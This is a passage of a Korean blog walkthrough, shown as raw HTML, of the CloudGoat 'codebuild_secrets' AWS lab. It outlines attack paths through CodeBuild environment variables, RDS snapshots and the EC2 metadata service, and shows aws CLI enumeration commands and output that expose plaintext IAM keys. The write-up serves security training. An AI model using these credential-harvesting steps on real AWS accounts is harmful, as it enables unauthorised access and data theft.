/>\n    </span></p>\n<h3 id=\"exploit-시나리오-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 시나리오 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 시나리오 흐름도</h3>\n<p><strong>RDS Snapshot → env “Calrissian”</strong></p>\n<ol>\n<li>IAM 사용자 Solo로서 공격자는 AWS 환경을 분석하고 CodeBuild 프로젝트에 대해 나열할 수가 있습니다.</li>\n<li>CodeBuild 프로젝트 내에서 공격자는 환경 변수에 지장된 “Calrissian” 에 대한 IAM 키를 검색합니다.</li>\n<li>“Calrissian” 사용자의 신원을 가정하면 공격자는 RDS 인스턴스를 나열하고 시나리오의 목표가 포함된 개인 데이터베이스를 검색할 수 있습니다.</li>\n<li>RDS 인스턴스에 직접 액세스 할 수는 없지만 공격자는 해당 인스턴스에서 스냅샷을 생성할 수 있습니다.</li>\n<li>그런 다음 공격자는 스냅샷에서 새로운 RDS 인스턴스를 생성할 수 있습니다.</li>\n<li>새로 생성된 RDS 인스턴스의 관리자 암호를 재설정해서 공격자는 자신에게 해당하는 콘테츠에 대한 액세스 권한을 부여할 수 있습니다.</li>\n<li>복원된 RDS 데이터베이스에 로그인한 후 공격자는 Secret String을 얻을 수 있게 됩니다.</li>\n</ol>\n<p><strong>EC2 Metadata service</strong></p>\n<ul>\n<li>Solo IAM 사용자 에 대한 AWS Credential과 해당 환경을 분석하면서 <code class=\"language-text\">SSM</code> 매개 변수를 나열할 수있음을 확인할 수 있습니다.</li>\n<li>공격자는 계정에 속하는 <code class=\"language-text\">SSM</code> 매개변수 중 암호화 없이 저장된 SSH key-pair를 찾습니다.</li>\n<li>공격자는 EC2 인스턴스를 나열하고 찾은 SSH key를 사용할 벡터를 찾습니다.</li>\n<li>계정에서 EC2 인스턴스를 발견한후 공격자는 EC2 인스턴스에 성공적으로 연결을 합니다.</li>\n</ul>\n<p><strong>EC2 Metadata Service를 Exploit하여 DB 정보를 가져온다.</strong></p>\n<ul>\n<li>쉘로 액세스하여 작업하면서 공격자는 EC2 메타데이터 서비스를 대상으로 쿼리를 하여 인스턴스 프로필 IAM 키를 검색합니다.</li>\n<li>EC2 인스턴스의 프로필 정보를 토대로 공격자는 Lambda 함수를 열거할 수 있습니다.</li>\n<li>공격자는 Lambda 환경 변수에 안전하지 않게 저장된 RDS 데이터베이스에 대한 관리자 Credential을 검색합니다.</li>\n<li>EC2 인스턴스의 프로필을 사용하는 공격자는 RDS 데이터베이스를 나열하고 액세스하며 발견한 관리자 Credential을 사용하여 로그인을 할 수 있습니다.</li>\n<li>RDS 데이터베이스에 대한 전체 액세스 권한이 있는 공격자 시나리오의 목표인 Security String을 복구할 수 있습니다.</li>\n</ul>\n<p><strong>EC2 Metadata Service를 Exploit하여 EC2 role, IAM key 정보들을 가져온다.</strong></p>\n<ul>\n<li>쉘로 액세스하여 작업하면서 공격자는 EC2 Metadata Service에 대해 쿼리하고 데이터베이스 주소가 관리자 Credential과 함께 저장되어 있음을 발견할 수 있습니다.</li>\n<li>EC2 메타데이터 서비스에서 복구된 RDS Credential, Address를 사용하여 공격자는 RDS 데이터베이스에 직접 로그인할 수 있습니다.</li>\n<li>RDS 데이터베이스에 대한 full-access 권한이 있는 공격자는 Security String을 복구할 수 있습니다.</li>\n</ul>\n<h2 id=\"exploit-시나리오\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\" aria-label=\"exploit 시나리오 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 시나리오</h2>\n<p><strong>AWS Code Build</strong></p>\n<ul>\n<li>소스 코드를 컴파일하는 단계부터 테스트 실행 후 소프트웨어 패키지를 개발하여 배포하는 단계까지 마칠 수 있는 완전 관리형의 지속적 통합 서비스입니다.</li>\n<li>Code Build를 사용하면 자체 빌드 서버를 프로비저닝, 관리 및 확장할 필요가 없습니다.</li>\n<li>CodeBuild는 지속적으로 확장되고 여러 빌드를 도시에 처리하기 때문에 빌드가 대기열에서 대기하지 않고 바로 처리됩니다.</li>\n<li>사전 패키딩된 빌드 환경을 사용하면 신속하게 시작할 수 있습니다.</li>\n<li>빌드 시간 100분 무료 (<code class=\"language-text\">build.general1.small</code> computing) 와우</li>\n</ul>\n<h3 id=\"iam-solo-사용자의-aws-credential-정보-노출\" style=\"position:relative;\"><a href=\"#iam-solo-%EC%82%AC%EC%9A%A9%EC%9E%90%EC%9D%98-aws-credential-%EC%A0%95%EB%B3%B4-%EB%85%B8%EC%B6%9C\" aria-label=\"iam solo 사용자의 aws credential 정보 노출 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>IAM Solo 사용자의 AWS Credential 정보 노출</h3>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">cloudgoat_output_aws_account_id <span class=\"token operator\">=</span> <span class=\"token string\">\"111111111111\"</span>\ncloudgoat_output_solo_access_key_id <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_KEY<span class=\"token operator\">></span>\ncloudgoat_output_solo_secret_key <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>sensitive<span class=\"token operator\">></span>\n\n<span class=\"token punctuation\">[</span>cloudgoat<span class=\"token punctuation\">]</span> terraform <span class=\"token builtin\">apply</span> completed <span class=\"token keyword\">with</span> no error code<span class=\"token punctuation\">.</span>\n\n<span class=\"token punctuation\">[</span>cloudgoat<span class=\"token punctuation\">]</span> terraform output completed <span class=\"token keyword\">with</span> no error code<span class=\"token punctuation\">.</span>\ncloudgoat_output_aws_account_id <span class=\"token operator\">=</span> <span class=\"token number\">111111111111</span>\ncloudgoat_output_solo_access_key_id <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_KEY<span class=\"token operator\">></span>\ncloudgoat_output_solo_secret_key <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>sensitive<span class=\"token operator\">></span></code></pre></div>\n<ul>\n<li>노출된 AWS Credentials 정보를 토대로 사용할 수 있는 권한이 무엇이 있는지 열거하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB50lEQVQozz2QW2/aQBCFt1ELiSrCxVxKgIANBt+vGGwgGJImImrSVKralyqq1P//H75qN2ofjmZGu5rzzRHlQ8jzj5i7F4tvh4Jf4SOn6Im+f8TzEmbzgLkVEacbvCAjjHLCOCdKNkRxzuG5R/ncYntqUT5piMMp4ufvLd//FLx+uec1fOHr7IjvbPHCgii5Uco39+Sbz6zyW9bFHcX2gTQrccIA07YZ6YbqhWVvsd09tn3DyIi50IbUumO6/RmfruZ0elMaLTmbNLQx7a7BcOzS1CbUm9e0uyaNlk69OaFS7SHS1YFsfSRZ7tntT3h+gevl+OGWMN7hBRuiZE+SHXC8NXG6Z5Xfoc9Cen0TraMrSeOPtSuE7a6x3RULJyOIdhiziOuJp6pppYx1n8HIRv5b2JnS1IyZzRP1731F40O1TeW8rapIswPL9S3xsmS3f1RElrPCCwqCeMfcStGnocpM0klSRbwsFeFlY4h4d4kQtTfJMxw/VzSSVLpL54kRKApz8Uai6JxMmUmDubVkMg3Uua22rnLWOgbC9QvC+EY9ylz6gwX9gcXw2vl/ruzlcjnL5XKh6nUfrWtQOe8oVS+6CBn8P8mwJYmkstwV0kxmKWlULGmpck6zo7pEmskMxVkdcdZQ9S+TyAsTslNCLgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/4b55598459f2ebc8a509eaab3430b8cd/37523/1.png\"\n        srcset=\"/static/4b55598459f2ebc8a509eaab3430b8cd/e9ff0/1.png 180w,\n/static/4b55598459f2ebc8a509eaab3430b8cd/f21e7/1.png 360w,\n/static/4b55598459f2ebc8a509eaab3430b8cd/37523/1.png 720w,\n/static/4b55598459f2ebc8a509eaab3430b8cd/efc66/1.png 885w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>IAM 사용자 Solo의 사용 권한을 확인해 보면 <code class=\"language-text\">EC2, CodeBuild, RDS, S3</code> 권한이 있는 것을 확인할 수 있습니다.</li>\n</ul>\n<h3 id=\"iam-user--solo-codebuild-project-권한-열거\" style=\"position:relative;\"><a href=\"#iam-user--solo-codebuild-project-%EA%B6%8C%ED%95%9C-%EC%97%B4%EA%B1%B0\" aria-label=\"iam user  solo codebuild project 권한 열거 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>IAM User : Solo, CodeBuild Project 권한 열거</h3>\n<ul>\n<li><code class=\"language-text\">CodeBuild</code> 관련 권한을 상용하여 쓸 수 있는 권한을 진행하였습니다. “Solo”가 접근할 수 있는 모든 CodeBuild 프로젝트를 나열하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABR0lEQVQY0y3OW08aQQBA4TEab+Wy4C4Is7Azu7gww7BsYRUSiVEwKvtgWkOixpc2MWn6/3/AaZr24STf4xE3mznbb5es1oZNOeX2MeO+nDC5e+baPLBKC6LEcpFmTPMldjzH2Bl2PMNNCsbjK6ZzR/lRxS3qiNl1l/JV87RTPO4i1s+SzUuLbV7wHqxZ+RlnnQSlHclFTi8yqNihkwzZG6HjjCgeEY8ktWYDIUQVIdp4nqVSSdnf77O31+P4pM1BNeCw1qVSk9SbEV+qkoNDHyGOEOL4f399ihAeQjQQZmIplhl2mjJfZHy9dBQLR2dxS3swI9GGsD8kUoZ0mBNpg9KWvjLEA/fvfDhg+VAhcXXETSl5/614+SnZfYZ8/xHy9qtDvi1odC2+36PeCPGaIUFL4weKsyDCbyla5zF+oAnOJYmrEUiPP8EGjyj59lK1AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/2ee440f4ecbb545067eaa39085c7a84c/37523/2.png\"\n        srcset=\"/static/2ee440f4ecbb545067eaa39085c7a84c/e9ff0/2.png 180w,\n/static/2ee440f4ecbb545067eaa39085c7a84c/f21e7/2.png 360w,\n/static/2ee440f4ecbb545067eaa39085c7a84c/37523/2.png 720w,\n/static/2ee440f4ecbb545067eaa39085c7a84c/764be/2.png 806w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>확인한 결과 CodeBuild Project가 하나 있는 것을 확인할 수 있습니다.</li>\n<li>해당 빌드 프로젝트와 관련된 정보를 더 검색보도록 하겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws codebuild batch<span class=\"token operator\">-</span>get<span class=\"token operator\">-</span>projects <span class=\"token operator\">-</span><span class=\"token operator\">-</span>names cg<span class=\"token operator\">-</span>codebuild<span class=\"token operator\">-</span>codebuild_secrets_cgidq5cx1pvldn <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile solo</code></pre></div>\n<ul>\n<li>CodeBuild Projects에 관련된 여러 정보들을 확인할 수 가 있는데 이중에서 환경변수에 관련된 정보만을 추출하기 위해서 query를 주고 다시 검색을 하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"projects\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-codebuild-codebuild_secrets_cgidq5cx1pvldn\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:codebuild:us-east-1:&lt;USERID>:project/cg-codebuild-codebuild_secrets_cgidq5cx1pvldn\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"source\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"type\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"NO_SOURCE\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"gitCloneDepth\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"buildspec\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"version: 0.2\\n\\nphases:\\n  pre_build:\\n    commands:\\n      - echo \\\"This is CloudGoat's simpliest buildspec file ever (maybe)\\\"\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"insecureSsl\"</span><span class=\"token punctuation\">:</span> false\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"artifacts\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"type\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"NO_ARTIFACTS\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"overrideArtifactName\"</span><span class=\"token punctuation\">:</span> false\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"cache\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"type\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"NO_CACHE\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"environment\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"type\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"LINUX_CONTAINER\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"image\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"aws/codebuild/standard:1.0\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"computeType\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"BUILD_GENERAL1_SMALL\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"environmentVariables\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"calrissian-aws-access-key\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"value\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AKIA2MALBVI56TKO4VUB\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"type\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"PLAINTEXT\"</span>\n                    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"calrissian-aws-secret-key\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"value\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"WFxne/U4OouOXcvgeBeiE69VaRWm6wQeBCf4IcXI\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"type\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"PLAINTEXT\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"privilegedMode\"</span><span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"imagePullCredentialsType\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"CODEBUILD\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"serviceRole\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:role/code-build-cg-codebuild_secrets_cgidq5cx1pvldn-service-role\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"timeoutInMinutes\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"queuedTimeoutInMinutes\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">480</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"encryptionKey\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:kms:us-east-1:&lt;USERID>:alias/aws/s3\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"tags\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"key\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"value\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-codebuild-codebuild_secrets_cgidq5cx1pvldn\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"key\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"value\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"codebuild-secrets\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"key\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"value\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"created\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-15T01:09:23.349000+09:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"lastModified\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-15T01:09:23.349000+09:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"badge\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"badgeEnabled\"</span><span class=\"token punctuation\">:</span> false\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"logsConfig\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"cloudWatchLogs\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"status\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"ENABLED\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"s3Logs\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"status\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"DISABLED\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"encryptionDisabled\"</span><span class=\"token punctuation\">:</span> false\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"projectsNotFound\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws codebuild batch<span class=\"token operator\">-</span>get<span class=\"token operator\">-</span>projects <span class=\"token operator\">-</span><span class=\"token operator\">-</span>names cg<span class=\"token operator\">-</span>codebuild<span class=\"token operator\">-</span>codebuild_secrets_cgidq5cx1pvldn <span class=\"token operator\">-</span><span class=\"token operator\">-</span>query <span class=\"token string\">\"projects[*].environment\"</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile solo</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 55.00000000000001%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB6UlEQVQoz32SW2/aQBCFF7AB2/iOLxg7DgEDLoSYJIU0BBKFVolaJa361KpSVUXNUx56kar+/FPNGiip2j6cnVnv7Nlvd8xu32V4+HmGjw9jfP42wd2XI9x/neLD63v8WNzh+/gNsuEEp/MlLpcvMV+8wOLiCucXV1g+f4WTZ5e4eZ/g7acEFdkCS0c9ZNMUceKjM4gQJw20egG6dgsjdx9pPYWmhdCMCIYVw6rvwiTZMWxnD4a1A0lpwrTbKAomWElwwJiFQpGiCUH0IJZ9lNUGmKCDMQmsoIEV9TwydaVVztc0sIKKQskAo6EkWpicLDHKZjgYn2G2uMZsfo3scI5W+wBxax9C2eamVEsk/xKjgUxdv8M37+wOEcUDLj/owfUTvqbqTYiVOq/dNljP15FtnFkNFclFOpwiCFOMj8+RHS6w18nQS58iCPsoV52/mm3PN4RULNd8bkpS1IB/o4Nyqb+1etP13m1Ktu1e05pIekdoRin6TyYYjk7R7R/znCjpORyvjbrbhm5GjwgpJ5CNIT06EflBF6oeclPH6/Ciquxx0YG0JtcaqMruI0NWNCApHhihkxmR9Qc5CTWEOkubNSPkTcmvv7ruH1feGMoeGBGIFZsTKGoDkuJz5RQej/RT/6/D24S/AADEFMJ042sBAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/d24b432a191500a4aa33c765c5b2a136/37523/3.png\"\n        srcset=\"/static/d24b432a191500a4aa33c765c5b2a136/e9ff0/3.png 180w,\n/static/d24b432a191500a4aa33c765c5b2a136/f21e7/3.png 360w,\n/static/d24b432a191500a4aa33c765c5b2a136/37523/3.png 720w,\n/static/d24b432a191500a4aa33c765c5b2a136/d4c13/3.png 825w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>CodeBuild Projects 세부 정보를 열거하는 동안 CodeBuild Project의 환경 변수에 IAM 사용자를 보면 <code class=\"language-text\">calrissian</code> 이라는 명칭을 확인할 수 있습니다.</li>\n<li>IAM Security Credential이 있음을 확인할 수 있고 해당 Credential 을 볼려면 이를 사용하는 Profile을 다시 생성하고 확인을 해야 합니다.</li>\n</ul>\n<h3 id=\"iam-user-calrissian-profile-등록-및-권한-열거\" style=\"position:relative;\"><a href=\"#iam-user-calrissian-profile-%EB%93%B1%EB%A1%9D-%EB%B0%8F-%EA%B6%8C%ED%95%9C-%EC%97%B4%EA%B1%B0\" aria-label=\"iam user calrissian profile 등록 및 권한 열거 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>IAM User: calrissian Profile 등록 및 권한 열거</h3>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token string\">\"environmentVariables\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"calrissian-aws-access-key\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"value\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AKIA2MALBVI56TKO4VUB\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"type\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"PLAINTEXT\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"calrissian-aws-secret-key\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"value\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"WFxne/U4OouOXcvgeBeiE69VaRWm6wQeBCf4IcXI\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"type\"</span><span class=\"token punctuation\">:</span> <span class=\"token 